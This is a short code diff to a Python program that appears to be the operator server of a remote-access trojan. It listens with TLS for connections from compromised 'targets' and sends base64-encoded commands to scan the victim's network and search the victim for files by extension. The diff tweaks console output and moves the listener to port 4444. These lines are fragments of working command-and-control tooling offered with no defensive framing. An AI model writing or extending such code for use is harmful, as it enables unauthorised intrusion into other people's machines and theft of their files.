@@ -564,7 +564,7 @@ def scannet(targetConn, command, cachedCommands):
     net = selectNet(ips)
     targetConn.send(net.encode())
     cachedCommands['commands'][command] = []
-    print(f"{B}[*>] {END} Scanning Net, this may take a while")
+    print(f"\n{B}[*>] {END} Scanning Net, this may take a while\n")
     nhosts = int(targetConn.recv(1024).decode())
     ndo = 1
     while ndo <= nhosts:
@@ -700,7 +700,6 @@ def searchExt(command, ext, targetConn, cachedCommands):
     codedCommand = "c2VhcmNo {}".format(ext)
     targetConn.send(codedCommand.encode())
     buffer = targetConn.recv(2048)
-    print(buffer)
     if "prt".encode() in buffer:
         f = receiveFileList(targetConn)
     else:
@@ -868,7 +867,7 @@ if __name__ == "__main__":
     print(f"{Y}[!>] {R}Waiting For incoming Conections...{END}")
     serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     serverSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    serverSock.bind(('0.0.0.0', 2457))
+    serverSock.bind(('0.0.0.0', 4444))
     serverSock.listen(5)
     serverSock = context.wrap_socket(serverSock)
     server(serverSock)
